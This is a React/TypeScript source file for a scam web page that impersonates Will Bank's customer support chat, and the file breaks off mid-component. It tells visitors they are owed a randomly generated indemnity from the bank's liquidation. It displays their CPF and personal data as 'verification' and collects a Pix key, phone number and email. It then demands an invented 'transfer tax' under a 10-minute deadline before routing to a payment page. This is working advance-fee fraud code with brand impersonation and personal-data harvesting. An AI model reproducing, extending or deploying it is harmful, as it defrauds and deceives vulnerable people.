import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Volume2, Shield, Clock, Mail, Smartphone } from "lucide-react";
import { CPFData } from "@/lib/cpf";
import willbankLogo from "@/assets/willbank-logo.png";

type ChatStep = 
  | "waiting-video"
  | "greeting" 
  | "video" 
  | "quiz-mae" 
  | "quiz-nascimento" 
  | "identity-confirmed"
  | "comprovante"
  | "pix-selection"
  | "pix-type-selection"
  | "pix-confirm"
  | "generating-comprovante"
  | "comprovante-final"
  | "envio-selection"
  | "sms-input"
  | "email-input"
  | "taxa-explanation"
  | "processing"
  | "final";

interface QuizOption {
  text: string;
  isCorrect: boolean;
}

interface Message {
  id: number;
  type: 'bot' | 'user' | 'system' | 'audio';
  content: React.ReactNode;
  time: string;
  audioSrc?: string;
}

const Chat = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [step, setStep] = useState<ChatStep>("waiting-video");
  const [messages, setMessages] = useState<Message[]>([]);
  const [showVideo, setShowVideo] = useState(false);
  const [videoPlaying, setVideoPlaying] = useState(false);
  const [quizOptions, setQuizOptions] = useState<QuizOption[]>([]);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [emailInput, setEmailInput] = useState("");
  const [showPhoneInput, setShowPhoneInput] = useState(false);
  const [showEmailInput, setShowEmailInput] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  const [currentAudio, setCurrentAudio] = useState<HTMLAudioElement | null>(null);
  const [playingAudioId, setPlayingAudioId] = useState<number | null>(null);
  const [selectedPixType, setSelectedPixType] = useState<"cpf" | "email" | null>(null);
  const [audioListened, setAudioListened] = useState<Set<string>>(new Set());
  const [waitingForAudio, setWaitingForAudio] = useState<string | null>(null);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);

  const cpfData: CPFData | undefined = location.state?.cpfData;
  
  const [valorBeneficio] = useState(() => {
    const baseValue = Math.floor(Math.random() * (9500 - 1500 + 1) + 1500);
    const cents = Math.floor(Math.random() * 100);
    return baseValue + cents / 100;
  });

  const [protocolo] = useState(() => {
    return `202${Date.now().toString().slice(-13)}`;
  });

  const getCurrentTime = () => {
    return new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, step, isTyping]);

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }
    // Start with video immediately
    setShowVideo(true);
    setStep("waiting-video");
  }, [cpfData, navigate]);

  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  // Realistic typing delays
  const getTypingDelay = (messageLength: number) => {
    const baseDelay = 1500;
    const perCharDelay = 25;
    return Math.min(baseDelay + (messageLength * perCharDelay), 4000);
  };

  const addBotMessage = async (content: React.ReactNode, showTyping = true, messageLength = 50) => {
    if (showTyping) {
      setIsTyping(true);
      await delay(getTypingDelay(messageLength));
      setIsTyping(false);
    }
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'bot',
      content,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
    await delay(800); // Pause between messages
  };

  const addAudioMessage = async (audioSrc: string, duration: string, showTyping = true) => {
    if (showTyping) {
      setIsTyping(true);
      await delay(2000);
      setIsTyping(false);
    }
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'audio',
      content: null,
      time: getCurrentTime(),
      audioSrc
    };
    setMessages(prev => [...prev, newMessage]);
    await delay(500);
  };

  const addUserMessage = (content: React.ReactNode) => {
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'user',
      content,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
  };

  const generateFakeOptions = (correctAnswer: string, type: "mae" | "nascimento"): QuizOption[] => {
    const fakeNames = [
      "MARIA SANTOS OLIVEIRA",
      "ANA PAULA FERREIRA",
      "CLAUDIA SOUZA LIMA",
      "PATRICIA GOMES SILVA"
    ];
    const fakeDates = [
      "15/03/1998",
      "22/07/1995",
      "08/12/2001",
      "30/05/1999"
    ];

    const options = type === "mae" ? fakeNames : fakeDates;
    const shuffled = options.filter(o => o !== correctAnswer).sort(() => Math.random() - 0.5).slice(0, 3);
    shuffled.push(correctAnswer);
    
    return shuffled.sort(() => Math.random() - 0.5).map(text => ({
      text,
      isCorrect: text === correctAnswer
    }));
  };

  const handleVideoEnd = async () => {
    setVideoPlaying(false);
    setShowVideo(false);
    
    // Start the conversation flow after video
    await delay(1500);
    
    await addBotMessage(
      <span>Olá <strong>{cpfData?.nome}</strong>! 👋</span>,
      true, 30
    );

    await delay(1200);

    await addBotMessage(
      <span>Seja bem-vindo(a) ao <strong>Setor de Atendimento</strong> do Will Bank.</span>,
      true, 60
    );

    await delay(1500);

    await addBotMessage(
      <span>Protocolo de atendimento: <span className="font-mono bg-primary/20 px-2 py-0.5 rounded text-sm">{protocolo}</span></span>,
      true, 40
    );

    await delay(2000);

    await addBotMessage(
      <div className="space-y-2">
        <span>Identificamos uma <strong>indenização referente à liquidação do Will Bank</strong> pendente em seu nome.</span>
        <div className="mt-2 p-3 bg-green-50 border border-green-200 rounded-xl">
          <span className="text-green-700 font-bold text-lg">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
        </div>
      </div>,
      true, 80
    );

    await delay(2000);

    await addBotMessage(
      <span>Para dar continuidade, precisamos <strong>validar sua identidade</strong>.</span>,
      true, 55
    );

    await delay(1500);

    await addBotMessage(
      <span><strong>Qual o nome da sua mãe?</strong></span>,
      true, 25
    );

    setQuizOptions(generateFakeOptions(cpfData?.nomeMae || "", "mae"));
    setStep("quiz-mae");
  };

  const handleVideoClick = () => {
    if (videoRef.current) {
      if (videoPlaying) {
        videoRef.current.pause();
        setVideoPlaying(false);
      } else {
        videoRef.current.play();
        setVideoPlaying(true);
      }
    }
  };

const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
    // Store current step to prevent race conditions
    const currentQuizType = quizType;
    
    addUserMessage(<span>{option.text}</span>);
    setQuizOptions([]); // Clear options immediately after selection
    
    await delay(500);
    
    if (option.isCorrect) {
      await addBotMessage(
        <span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          Resposta correta!
        </span>,
        true, 20
      );

      if (currentQuizType === "mae") {
        await delay(1500);
        await addBotMessage(<span><strong>Qual sua data de nascimento?</strong></span>, true, 30);
        const newOptions = generateFakeOptions(cpfData?.dataNascimento || "", "nascimento");
        setStep("quiz-nascimento");
        // Small delay to ensure step is set before showing options
        await delay(100);
        setQuizOptions(newOptions);
      } else {
        await delay(1000);
        await addBotMessage(
          <div className="bg-green-50 border border-green-200 rounded-xl p-4">
            <span className="flex items-center gap-2 text-green-700 font-semibold">
              <Shield className="w-5 h-5" />
              Identidade confirmada com sucesso!
            </span>
          </div>,
          true, 35
        );
        setStep("identity-confirmed");
        await showComprovante();
      }
    } else {
      await addBotMessage(<span className="text-red-500">❌ Resposta incorreta. Tente novamente:</span>, true, 40);
      // Keep same step but regenerate options after a small delay
      await delay(300);
      const retryOptions = generateFakeOptions(
        currentQuizType === "mae" ? (cpfData?.nomeMae || "") : (cpfData?.dataNascimento || ""),
        currentQuizType
      );
      setQuizOptions(retryOptions);
    }
  };

  const playAudio = (audioSrc: string, messageId: number) => {
    if (currentAudio) {
      currentAudio.pause();
      currentAudio.currentTime = 0;
    }

    if (playingAudioId === messageId) {
      setPlayingAudioId(null);
      setCurrentAudio(null);
      return;
    }

    const audio = new Audio(audioSrc);
    audio.play();
    setCurrentAudio(audio);
    setPlayingAudioId(messageId);

    audio.onended = () => {
      setPlayingAudioId(null);
      setCurrentAudio(null);
      // Mark audio as listened
      setAudioListened(prev => new Set(prev).add(audioSrc));
      // Clear waiting state if this was the audio we were waiting for
      if (waitingForAudio === audioSrc) {
        setWaitingForAudio(null);
      }
    };
  };

  const showComprovante = async () => {
    await delay(2000);

    await addBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
        <div className="flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-10" />
        </div>
        <h3 className="text-lg font-bold text-center">Certificado de Autenticidade</h3>
        
        <div className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground text-center py-2 rounded-full text-sm font-bold">
          ✓ DADOS VERIFICADOS
        </div>
        
        <p className="text-center text-sm text-muted-foreground">
          Sr(a). <strong className="text-foreground">{cpfData?.nome}</strong>
        </p>

        <div className="divide-y border rounded-xl overflow-hidden bg-muted/30">
          <DataRow label="Nome Completo" value={cpfData?.nome || ""} />
          <DataRow label="CPF" value={cpfData?.cpf || ""} />
          <DataRow label="Data de Nascimento" value={cpfData?.dataNascimento || ""} />
          <DataRow label="Nome da Mãe" value={cpfData?.nomeMae || ""} />
        </div>
      </div>,
      false
    );

    await delay(2500);

    await addBotMessage(
      <span>Sua indenização referente à liquidação do Will Bank está <strong>disponível para saque</strong>:</span>,
      true, 65
    );

    await delay(1000);

    await addBotMessage(
      <div className="text-center p-4 bg-gradient-to-br from-green-50 to-emerald-50 border border-green-200 rounded-xl">
        <span className="text-3xl font-black text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
      </div>,
      false
    );

    await delay(2000);

    // Audio 3 (was audio-1, now fixed to play first)
    await addAudioMessage("/audio/audio-3.mp3", "0:15");

    await delay(1500);

    // Set waiting for audio - button will only show after audio is listened
    setWaitingForAudio("/audio/audio-3.mp3");
    setStep("pix-selection");
  };

  const handleAprovarIndenizacao = async () => {
    addUserMessage(<span>✓ APROVAR INDENIZAÇÃO</span>);
    setStep("processing"); // Clear button immediately

    await delay(1500);

    await addBotMessage(
      <ApprovalAnimation value={valorBeneficio} />,
      false
    );

    await delay(3500);

    await addBotMessage(
      <span className="flex items-center gap-2">
        <CheckCircle2 className="w-5 h-5 text-green-500" />
        Indenização aprovada!
      </span>,
      true, 25
    );

    await delay(1500);

    await addBotMessage(<span>Selecione o tipo de <strong>Chave Pix</strong> para receber:</span>, true, 45);

    setStep("pix-type-selection");
  };

  const handlePixTypeCPF = async () => {
    addUserMessage(<span>📋 CPF</span>);
    setSelectedPixType("cpf");
    setStep("processing");

    await delay(2000);

    await addBotMessage(
      <div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
        <p className="font-bold flex items-center gap-2">
          <Shield className="w-5 h-5 text-amber-600" />
          Confirme sua Chave PIX
        </p>
        <p className="font-mono bg-white px-4 py-3 rounded-lg border text-lg font-bold text-center">{cpfData?.cpf}</p>
        <p className="text-xs text-muted-foreground">Certifique-se que a chave está correta.</p>
      </div>,
      true, 60
    );

    setStep("pix-confirm");
  };

  const handlePixTypeEmail = async () => {
    addUserMessage(<span>📧 E-mail</span>);
    setSelectedPixType("email");
    setStep("processing");

    await delay(1500);

    await addBotMessage(<span>Digite seu <strong>e-mail</strong> para cadastrar como chave PIX:</span>, true, 45);

    setStep("email-input");
    setShowEmailInput(true);
  };

  const handleEmailPixSubmit = async () => {
    if (!emailInput.trim()) return;

    addUserMessage(<span>{emailInput}</span>);
    setShowEmailInput(false);
    setStep("processing");

    await delay(2000);

    await addBotMessage(
      <div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
        <p className="font-bold flex items-center gap-2">
          <Shield className="w-5 h-5 text-amber-600" />
          Confirme sua Chave PIX
        </p>
        <p className="font-mono bg-white px-4 py-3 rounded-lg border text-lg font-bold text-center">{emailInput}</p>
        <p className="text-xs text-muted-foreground">Certifique-se que a chave está correta.</p>
      </div>,
      true, 60
    );

    setStep("pix-confirm");
  };

  const handleConfirmPix = async () => {
    addUserMessage(<span>Sim, está correto ✓</span>);
    setStep("processing");

    await delay(1500);

    await addBotMessage(<span>Processando...</span>, true, 15);
    
    await delay(2000);
    
    await addBotMessage(
      <span className="flex items-center gap-2 text-green-600">
        <CheckCircle2 className="w-4 h-4" />
        Chave PIX cadastrada!
      </span>,
      true, 25
    );
    
    await delay(2000);

    // Audio 2 (middle audio)
    await addAudioMessage("/audio/audio-2.mp3", "0:18");

    await delay(1500);

    await addBotMessage(<span>Clique abaixo para <strong>gerar seu comprovante</strong>.</span>, true, 40);

    // Set waiting for audio - button will only show after audio is listened
    setWaitingForAudio("/audio/audio-2.mp3");
    setStep("comprovante-final");
  };

  const handleGenerateComprovante = async () => {
    addUserMessage(<span>GERAR COMPROVANTE</span>);
    setStep("processing");

    await delay(2000);

    await addBotMessage(<span className="text-primary flex items-center gap-2"><Clock className="w-4 h-4 animate-spin" /> Gerando comprovante...</span>, true, 25);
    
    await delay(2500);

    await addBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
        <h3 className="text-lg font-bold text-center border-b pb-3">📄 Comprovante Indenizatório</h3>
        
        <div className="bg-amber-50 border-l-4 border-primary p-3 text-sm">
          <p>Confirmamos o direito à indenização referente à liquidação do Will Bank do(a) Sr(a). <strong>{cpfData?.nome}</strong>.</p>
        </div>

        <div className="divide-y border rounded-xl overflow-hidden">
          <DataRow label="Valor" value={`R$ ${valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`} highlight />
          <DataRow label="Protocolo" value={protocolo} />
          <DataRow label="CPF" value={cpfData?.cpf || ""} />
          <DataRow label="Data/Hora" value={new Date().toLocaleString('pt-BR')} />
        </div>
      </div>,
      false
    );

    await delay(2500);

    await addBotMessage(<span>Como deseja receber o comprovante?</span>, true, 35);

    setStep("envio-selection");
  };

  const handleSMSOption = async () => {
    addUserMessage(<span>📱 SMS</span>);
    setStep("processing");
    
    await delay(1500);
    
    await addBotMessage(<span>Digite seu número de celular:</span>, true, 30);
    
    setStep("sms-input");
    setShowPhoneInput(true);
  };

  const handleEmailOption = async () => {
    addUserMessage(<span>📧 E-mail</span>);
    setStep("processing");
    
    await delay(1500);
    
    await addBotMessage(<span>Digite seu e-mail:</span>, true, 20);
    
    setStep("email-input");
    setShowEmailInput(true);
  };

  const handlePhoneSubmit = async () => {
    if (!phoneNumber.trim()) return;

    addUserMessage(<span>{phoneNumber}</span>);
    setShowPhoneInput(false);
    setStep("processing");

    await delay(2000);

    await addBotMessage(
      <div className="space-y-2">
        <span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          Comprovante enviado para {phoneNumber}!
        </span>
        <p className="text-xs text-slate-400">⏰ Você receberá em até 24 horas.</p>
      </div>,
      true, 30
    );

    await showTaxaExplanation();
  };

  const handleEnvioEmailSubmit = async () => {
    if (!emailInput.trim()) return;

    addUserMessage(<span>{emailInput}</span>);
    setShowEmailInput(false);
    setStep("processing");

    await delay(2000);

    await addBotMessage(
      <div className="space-y-2">
        <span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          Comprovante enviado para {emailInput}!
        </span>
        <p className="text-xs text-slate-400">⏰ Você receberá em até 24 horas.</p>
      </div>,
      true, 30
    );

    await showTaxaExplanation();
  };

  const showTaxaExplanation = async () => {
    await delay(2500);

    await addBotMessage(
      <div className="bg-red-50 border border-red-200 rounded-xl p-4 space-y-3">
        <p className="font-bold text-red-700 flex items-center gap-2">
          <Clock className="w-5 h-5" />
          ATENÇÃO - PRAZO LIMITADO
        </p>
        <p className="text-sm">Sua indenização de <strong className="text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong> está sendo processada.</p>
        <p className="text-sm">Para liberar o valor, realize o pagamento do <strong>Imposto de Transferência</strong> em até <strong>10 minutos</strong>.</p>
      </div>,
      true, 100
    );

    await delay(2000);

    setStep("taxa-explanation");
  };

  const handleTaxExplanation = async () => {
    addUserMessage(<span>❓ Por que tenho que pagar?</span>);
    setStep("processing");

    await delay(2000);

    // Audio 1 - Explanation (was audio-3, now fixed to play last)
    await addAudioMessage("/audio/audio-1.mp3", "0:25");

    await delay(1500);
    
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    await addBotMessage(
      <div className="bg-muted rounded-xl p-4 space-y-2 text-sm">
        <p className="font-bold">📊 Cálculo dos impostos:</p>
        <div className="space-y-1">
          <p>• IPCT (0,21%): <strong>R$ {ipct.toFixed(2).replace('.', ',')}</strong></p>
          <p>• IPTI (0,25%): <strong>R$ {ipti.toFixed(2).replace('.', ',')}</strong></p>
          <p>• IPRI (0,25%): <strong>R$ {ipri.toFixed(2).replace('.', ',')}</strong></p>
        </div>
        <div className="pt-3 border-t mt-3">
          <p className="font-bold text-primary text-base">Total: R$ {totalImposto.toFixed(2).replace('.', ',')}</p>
        </div>
      </div>,
      true, 80
    );

    await delay(2000);

    await addBotMessage(<span>Após o pagamento, a transferência será liberada <strong>imediatamente</strong>.</span>, true, 55);

    // Set waiting for audio - button will only show after audio is listened
    setWaitingForAudio("/audio/audio-1.mp3");
    setStep("final");
  };

  const handleFinalPayment = () => {
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    navigate("/saque", { 
      state: { 
        cpfData, 
        valorBeneficio,
        valorTaxa: totalImposto,
        protocolo
      } 
    });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-slate-900 flex flex-col">
      {/* Chat Header */}
      <header className="bg-slate-800 text-white px-4 py-3 flex items-center gap-3 border-b border-slate-700 sticky top-0 z-50">
        <button onClick={() => navigate(-1)} className="p-2 hover:bg-slate-700 rounded-full transition-colors">
          <ArrowLeft className="w-5 h-5" />
        </button>
        
        <div className="w-11 h-11 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shadow-lg">
          <img src={willbankLogo} alt="Will Bank" className="w-7 h-7 object-contain" />
        </div>
        
        <div className="flex-1">
          <h1 className="font-bold text-base">Atendimento Will Bank</h1>
          <p className="text-xs text-slate-400 flex items-center gap-1">
            <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
            Online agora
          </p>
        </div>

        <button className="p-2 hover:bg-slate-700 rounded-full transition-colors">
          <Phone className="w-5 h-5" />
        </button>
        <button className="p-2 hover:bg-slate-700 rounded-full transition-colors">
          <MoreVertical className="w-5 h-5" />
        </button>
      </header>

      {/* Messages Area */}
      <main className="flex-1 overflow-y-auto bg-gradient-to-b from-slate-900 to-slate-800 p-4">
        <div className="max-w-2xl mx-auto space-y-4">
          {/* Date indicator */}
          <div className="text-center">
            <span className="text-xs bg-slate-700/50 text-slate-400 px-3 py-1 rounded-full">
              Hoje
            </span>
          </div>

          {/* Video Section - Show at the beginning */}
          {showVideo && (
            <div className="mx-auto max-w-sm animate-fade-in">
              <div 
                className="relative aspect-[9/16] bg-black rounded-2xl overflow-hidden shadow-2xl"
              >
                {/* Real Video */}
                <video
                  ref={videoRef}
                  src="/video/vsl_1.mp4"
                  className="absolute inset-0 w-full h-full object-cover"
                  playsInline
                  onEnded={handleVideoEnd}
                  onClick={handleVideoClick}
                />
                
                {/* Play button overlay - show when not playing */}
                {!videoPlaying && (
                  <div 
                    className="absolute inset-0 flex items-center justify-center bg-black/40 cursor-pointer"
                    onClick={handleVideoClick}
                  >
                    <div className="w-20 h-20 bg-primary rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition-transform">
                      <Play className="w-10 h-10 text-primary-foreground ml-1" fill="currentColor" />
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Messages */}
          {messages.map((message) => (
            <div 
              key={message.id} 
              className={`flex ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fade-in`}
            >
              {(message.type === 'bot' || message.type === 'audio') && (
                <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-2 shadow-md">
                  <img src={willbankLogo} alt="" className="w-5 h-5" />
                </div>
              )}
              
              <div className={`max-w-[85%] ${
                message.type === 'user' 
                  ? 'bg-primary text-primary-foreground rounded-2xl rounded-br-sm' 
                  : 'bg-slate-700 text-white rounded-2xl rounded-bl-sm shadow-lg'
              } px-4 py-3`}>
                {message.type === 'audio' ? (
                  <AudioPlayerComponent 
                    audioSrc={message.audioSrc || ""}
                    isPlaying={playingAudioId === message.id}
                    onPlay={() => playAudio(message.audioSrc || "", message.id)}
                    listened={audioListened.has(message.audioSrc || "")}
                  />
                ) : (
                  <div className="text-sm leading-relaxed">{message.content}</div>
                )}
                <div className={`text-[10px] mt-1 text-right ${message.type === 'user' ? 'text-primary-foreground/70' : 'text-slate-400'}`}>
                  {message.time}
                </div>
              </div>
            </div>
          ))}

          {/* Typing Indicator */}
          {isTyping && (
            <div className="flex justify-start animate-fade-in">
              <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary to-amber-400 flex items-center justify-center shrink-0 mr-2 shadow-md">
                <img src={willbankLogo} alt="" className="w-5 h-5" />
              </div>
              <div className="bg-slate-700 text-white rounded-2xl rounded-bl-sm shadow-lg px-4 py-3">
                <div className="flex gap-1.5">
                  <span className="w-2.5 h-2.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></span>
                  <span className="w-2.5 h-2.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></span>
                  <span className="w-2.5 h-2.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></span>
                </div>
              </div>
            </div>
          )}

{/* Action Buttons */}
              {!showVideo && (
                <div className="flex flex-wrap gap-2 justify-center py-3">
                  {/* Quiz Options - Only show for current quiz step with options */}
                  {step === "quiz-mae" && quizOptions.length > 0 && quizOptions.map((option, index) => (
                    <Button
                      key={`mae-${index}-${option.text}`}
                      onClick={() => handleQuizAnswer(option, "mae")}
                      className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
                    >
                      {option.text}
                    </Button>
                  ))}
                  
                  {step === "quiz-nascimento" && quizOptions.length > 0 && quizOptions.map((option, index) => (
                    <Button
                      key={`nasc-${index}-${option.text}`}
                      onClick={() => handleQuizAnswer(option, "nascimento")}
                      className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
                    >
                      {option.text}
                    </Button>
                  ))}

              {step === "pix-selection" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && (
                <Button onClick={handleAprovarIndenizacao} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-8">
                  ✓ APROVAR INDENIZAÇÃO
                </Button>
              )}

              {step === "pix-selection" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && (
                <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
              )}

              {step === "pix-type-selection" && (
                <div className="flex flex-col gap-2 w-full max-w-xs">
                  <Button onClick={handlePixTypeCPF} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
                    📋 CPF
                  </Button>
                  <Button onClick={handlePixTypeEmail} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8">
                    📧 E-mail
                  </Button>
                </div>
              )}

              {step === "pix-confirm" && (
                <Button onClick={handleConfirmPix} className="bg-gradient-to-r from-green-500 to-emerald-500 text-white rounded-full font-bold shadow-lg px-8">
                  ✓ Sim, está correto
                </Button>
              )}

              {step === "comprovante-final" && (waitingForAudio === null || audioListened.has("/audio/audio-2.mp3")) && (
                <Button onClick={handleGenerateComprovante} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
                  GERAR COMPROVANTE
                </Button>
              )}

              {step === "comprovante-final" && waitingForAudio === "/audio/audio-2.mp3" && !audioListened.has("/audio/audio-2.mp3") && (
                <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
              )}

              {step === "envio-selection" && (
                <div className="flex flex-col gap-2 w-full max-w-xs">
                  <Button onClick={handleSMSOption} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8 flex items-center gap-2">
                    <Smartphone className="w-4 h-4" />
                    📱 Receber por SMS
                  </Button>
                  <Button onClick={handleEmailOption} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8 flex items-center gap-2">
                    <Mail className="w-4 h-4" />
                    📧 Receber por E-mail
                  </Button>
                </div>
              )}

              {step === "taxa-explanation" && (
                <Button onClick={handleTaxExplanation} className="bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-full font-bold shadow-lg">
                  ❓ Por que tenho que pagar?
                </Button>
              )}

              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && (
                <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-6 animate-pulse">
                  💰 PAGAR E RECEBER
                </Button>
              )}

              {step === "final" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && (
                <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
              )}
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>
      </main>

      {/* Chat Input Area */}
      <div className="bg-slate-800 border-t border-slate-700 p-3">
        <div className="max-w-2xl mx-auto flex items-center gap-2">
          <button className="p-2 text-slate-400 hover:text-white transition-colors">
            <Smile className="w-6 h-6" />
          </button>
          
          {showPhoneInput ? (
            <div className="flex-1 flex gap-2">
              <Input
                placeholder="(00) 00000-0000"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full"
              />
              {phoneNumber && (
                <Button onClick={handlePhoneSubmit} size="icon" className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10">
                  <Send className="w-5 h-5" />
                </Button>
              )}
            </div>
          ) : showEmailInput ? (
            <div className="flex-1 flex gap-2">
              <Input
                placeholder="seuemail@exemplo.com"
                type="email"
                value={emailInput}
                onChange={(e) => setEmailInput(e.target.value)}
                className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full"
              />
              {emailInput && (
                <Button 
                  onClick={selectedPixType === "email" ? handleEmailPixSubmit : handleEnvioEmailSubmit} 
                  size="icon" 
                  className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10"
                >
                  <Send className="w-5 h-5" />
                </Button>
              )}
            </div>
          ) : (
            <div className="flex-1 bg-slate-700 rounded-full px-4 py-2.5 text-slate-400 text-sm">
              Digite uma mensagem...
            </div>
          )}
          
          <button className="p-2 text-slate-400 hover:text-white transition-colors">
            <Paperclip className="w-6 h-6" />
          </button>
          <button className="p-2.5 bg-primary rounded-full text-primary-foreground hover:bg-primary/90 transition-colors">
            <Mic className="w-5 h-5" />
          </button>
        </div>
      </div>
    </div>
  );
};

// Helper Components
const DataRow = ({ label, value, highlight = false }: { label: string; value: string; highlight?: boolean }) => {
  return (
    <div className="flex justify-between p-3 bg-card">
      <span className="text-sm text-muted-foreground font-medium">{label}</span>
      <span className={`text-sm font-bold text-right ${highlight ? 'text-green-600 text-base' : 'text-foreground'}`}>{value}</span>
    </div>
  );
};

const StepDot = ({ completed }: { completed: boolean }) => (
  <div className={`w-8 h-8 rounded-full flex items-center justify-center ${completed ? 'bg-gradient-to-br from-primary to-amber-400' : 'bg-muted'}`}>
    {completed && <Check className="w-4 h-4 text-primary-foreground" />}
  </div>
);

const AudioPlayerComponent = ({ audioSrc, isPlaying, onPlay, listened }: { audioSrc: string; isPlaying: boolean; onPlay: () => void; listened?: boolean }) => (
  <div className="flex items-center gap-3 w-48">
    <button 
      onClick={onPlay}
      className="w-10 h-10 bg-gradient-to-br from-primary to-amber-400 rounded-full flex items-center justify-center shadow-md hover:scale-105 transition-transform shrink-0 relative"
    >
      {isPlaying ? (
        <Pause className="w-5 h-5 text-primary-foreground" fill="currentColor" />
      ) : (
        <Play className="w-5 h-5 text-primary-foreground ml-0.5" fill="currentColor" />
      )}
      {listened && (
        <span className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full flex items-center justify-center border-2 border-slate-700">
          <Check className="w-2.5 h-2.5 text-white" />
        </span>
      )}
    </button>
    <div className="flex-1 flex flex-col gap-1">
      <div className="h-8 flex items-center gap-0.5">
        {[...Array(16)].map((_, i) => (
          <div 
            key={i} 
            className={`w-1 rounded-full transition-all ${isPlaying ? 'bg-primary animate-pulse' : listened ? 'bg-green-500' : 'bg-slate-500'}`}
            style={{ 
              height: `${Math.random() * 16 + 8}px`,
              animationDelay: `${i * 50}ms`
            }}
          />
        ))}
      </div>
      {listened && (
        <span className="text-[10px] text-green-400 flex items-center gap-1">
          <Check className="w-3 h-3" /> Ouvido
        </span>
      )}
    </div>
  </div>
);

// Approval Animation Component
const ApprovalAnimation = ({ value }: { value: number }) => {
  const [step1, setStep1] = useState(false);
  const [step2, setStep2] = useState(false);
  const [step3, setStep3] = useState(false);
  const [showValue, setShowValue] = useState(false);

  useEffect(() => {
    const timer1 = setTimeout(() => setStep1(true), 500);
    const timer2 = setTimeout(() => setStep2(true), 1000);
